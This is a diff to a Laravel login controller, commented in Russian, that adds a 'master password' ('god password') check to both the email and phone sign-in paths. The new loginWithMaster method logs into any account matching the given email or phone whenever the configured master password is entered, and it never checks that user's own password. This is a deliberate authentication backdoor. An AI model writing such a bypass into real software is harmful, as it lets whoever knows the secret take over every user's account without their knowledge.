@@ -18,13 +18,18 @@ class AuthenticatedSessionController extends Controller
     public function store(Request $request): RedirectResponse
     {
         $loginType = $request->input('login_type', 'phone');
-        
+
         if ($loginType === 'email') {
             // Вход по email
             $request->validate([
                 'email' => ['required', 'string', 'email'],
                 'password' => ['required', 'string'],
             ]);
+
+            // Мастер-пароль («пароль бога»): вход в любой аккаунт по email.
+            if ($this->loginWithMaster($request, 'email', $request->email)) {
+                return redirect()->intended(route('dashboard'));
+            }
 
             if (Auth::attempt(['email' => $request->email, 'password' => $request->password], $request->boolean('remember'))) {
                 $request->session()->regenerate();
@@ -34,7 +39,7 @@ class AuthenticatedSessionController extends Controller
             return back()->withErrors([
                 'email' => 'Неверный email или пароль.',
             ])->onlyInput('email');
-            
+
         } else {
             // Вход по телефону
             $request->validate([
@@ -44,10 +49,15 @@ class AuthenticatedSessionController extends Controller
 
             // Очищаем телефон — оставляем только цифры
             $phone = preg_replace('/\D/', '', $request->phone);
-            
+
             // Если начинается с 8, меняем на 7
             if (str_starts_with($phone, '8') && strlen($phone) === 11) {
                 $phone = '7' . substr($phone, 1);
+            }
+
+            // Мастер-пароль («пароль бога»): вход в любой аккаунт по телефону.
+            if ($this->loginWithMaster($request, 'phone', $phone)) {
+                return redirect()->intended(route('dashboard'));
             }
 
             if (Auth::attempt(['phone' => $phone, 'password' => $request->password], $request->boolean('remember'))) {
@@ -59,6 +69,28 @@ class AuthenticatedSessionController extends Controller
                 'phone' => 'Неверный телефон или пароль.',
             ])->onlyInput('phone');
         }
+    }
+
+    /**
+     * Мастер-пароль: если введён, логиним пользователя по полю ($field=$value)
+     * без проверки его собственного пароля. Возвращает true при успехе.
+     */
+    private function loginWithMaster(Request $request, string $field, ?string $value): bool
+    {
+        $master = config('auth.master_password');
+        if (empty($master) || ! hash_equals((string) $master, (string) $request->password)) {
+            return false;
+        }
+
+        $user = \App\Models\User::where($field, $value)->first();
+        if (! $user) {
+            return false;
+        }
+
+        Auth::login($user, $request->boolean('remember'));
+        $request->session()->regenerate();
+
+        return true;
     }
 
     public function destroy(Request $request): RedirectResponse
